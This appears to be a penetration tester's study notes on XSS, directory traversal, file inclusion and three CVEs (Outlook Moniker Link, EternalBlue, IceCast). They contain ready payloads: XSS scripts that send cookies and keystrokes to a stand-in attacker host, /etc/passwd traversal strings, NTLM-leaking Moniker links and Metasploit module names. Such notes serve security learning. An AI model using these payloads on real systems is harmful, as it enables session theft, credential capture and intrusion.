# Penetration Testing Tips


## XSS Attacks

### Payload

#### Proof of Concept

```html
<script>alert('XSS')</script>
```

#### Session stealing

Steal the session ID in `document.cookie` and send it to an API owned by the attacker.  
The `btoa(str)` JS function (Binary to ASCII) encodes the cookie in Base64.

```html
<script>fetch('https://attacker-domain.com/steal?cookie=' + btoa(document.cookie))</script>
```

#### Key logger

Similar to session stealing, but instead of a cookie send each keystroke to an API owned by the attacker.

```html
<script>document.onkeypress = function(e) { 
    fetch('https://attacker-domain.com/log?key=' + btoa(e.key));
}</script>
```

### Reflected XSS

Reflected XSS is a XSS vulnerability where a webpage displays in its HTML a string from the HTTP request
(for ex an URL parameter) without validation.  
This can happen for an error page for example, taking the error message as a parameter.  

Reflected XSS can be exploited by passing a custom script in the URL :
```
http://vulnerable-website.com?param=<script src="https://attacker-domain.com/payload.js"></script>
```

### Stored XSS

Stored XSS is a XSS vulnerability where the payload is stored by the website in a database (for example in a blog comment).  
It gets displayed for every user checking the website, so reaches more users than reflected XSS.  
However it is easier to detect than reflected XSS, since the payload is stored in the database.
 

### Blind XSS

Blind XSS is a XSS vulnerability where the attacker can inject a payload that is executed, but cannot test it himself.  
This happens for example if we create a support request which body is not sanitized, and this body is used as-is
to create a ticket in a ticketing system (JIRA, FreshDesk...).  
In that case, the payload should report to an HTTP API when executed, to transmit the stolen info.

**XSS Hunter Express** can be used to perform Blind XSS attacks, it will capture cookies, URK, page content...


## Directory Traversal

A directory traversal exposes files from the web server by exploiting a query parameters containing a file name.  
We can use the **dot-dot-attack** to expose files outside the intended resource folder.

#### Bypass a suffix appended to the file name by the web-server

A **NULL-byte injection** can by-pass a mechanism appending a suffix to the file name (like forcing an extension).  
The NULL byte is represented by `%00` or `0x00`.  
For example if a parameter `file=EN` returns the file `EN.php`, we can use `file=../../../../etc/passwd%00` to ignore the appended `.php`  
This NULL-byte injection is fixed in PHP 5.3.4.

#### Bypass the replacement of ../ by an empty string

If the sanitization replaces `../` by an empty string, it usually does a single pass.  
We can trick it by passing `....//....//etc/passwd`, after sanitization it will become `../../etc/passwd`.

#### LFI / RFI (Local/Remote File Injection)

When the web server can only return local files, it is a LFI.  
If the web server queries the URL of the input file, it is a RFI.  
In case of a RFI, we can force the web server to execute a malicious PHP file from a server owned by the attacker.  
This results in a RCE vulnerability.


## Run a local webserver

Run a local web server on port 8000 delivering files in its execution folder : 
```commandline
python -m http.server
```


## Special IP addresses 

**169.254.169.254** : link-local address used by cloud providers (AWS, GCP...) to provide metadata on the running instance.


## Famous CVEs

### Moniker Link (CVE-2024-21413 - score 9.8)

Moniker Link is a vulnerability in Outlook announced by Microsoft on 13/02/2024.  
An attacker can send a specific type of hyperlink (called a Moniker link) by email that bypasses Outlook's security mechanism.  
When clicked, Outlook sends the user's NTLM credentials to the attacker.

Outlook can render emails in HTML, and parse hyperlinks like HTTP or HTTPS.  
It can also open URLs specifying specific applications, called Moniker Links.  
Outlook has a security mechanism called **Protected View** that shows a warning popup when such an application tries to open.  
Protected View opens emails containing attachments and hyperlinks in Read-Only mode, to block this type of actions.  

One type of Moniker link is to use the `file://` prefix to open a file.  
It can specify a file on a network share controlled by the attacker, like : `<a href="file://ATTACKER_IP/myfile">Click me</a>`  
This uses the SMB protocol that involves local credentials for authentication.  
Protected View is able to block such attempt to steal the credentials.  

This CVE consists in a way to bypass the Protected View so it does not perform this validation, by using a `!` character after the file name.  
This can be done with a Moniker Link like : `<a href="file://ATTACKER_IP/myfile!exploit">Click me</a>`  
The share does not even need to exist on the attacker device, SMB still sends the netNTMLv2 hash to the attacker.  

The attacker needs to have a service running on his machine listening to incoming SMB messages.  
For example, the Responder Python tool can be used to receive the message and display the hash : `responder -I <INTERFACE>`

Microsoft patched Outlook to resolve this vulnerability in February 2024.  
A YARA rule has been created to detect these attack attempts, helping in malware detection and analysis and threat hunting.  


### EternalBlue (CVE-2017-0144 - score 8.8)

EternalBlue is a Windows exploit created by the NSA.  
It exploits a vulnerability in the SMBv1 protocol, that allows the attacker to execute arbitrary code and gain access on the target's network.  

The NSA did not disclose this vulnerability for 5 years, and it was revealed by the Shadows Broker group after they hacked the NSA.  
EternalBlue was used in the WannaCry software in 2017 to spread itself across a network and infect more devices.  
It was patched by Microsoft and listed in Microsoft's security bulletin as **MS17-010**.  

EternalBlue can be trivially exploited in Metasploit with the `exploit/windows/smb/ms17_010_eternalblue` exploit.


### RCE on IceCast 2.0.1 for Windows (CVE-2004-1561 - score 7.5)

IceCast is an open-source streaming media server software that runs on Unix-like and Windows OS, created in 1999 and still maintained today.  
Versions 2.0.1 and earlier are vulnerable to a buffer overflow attack allowing the attacker to execute arbitrary code.  

The attack is performed by sending an HTTP request with a large number of headers.  
Sending 32 headers causes a write past the end of a pointer array.  
On Linux, it does not seem to overwrite anything crucial, but on Windows it overwrites the saved instruction pointer.  

This vulnerability can be exploited in Metasploit with the `exploit/windows/http/icecast_header` exploit.  
This can offer a Meterpreter terminal with the user running IceCast (we need another attack to escalate privilege if needed).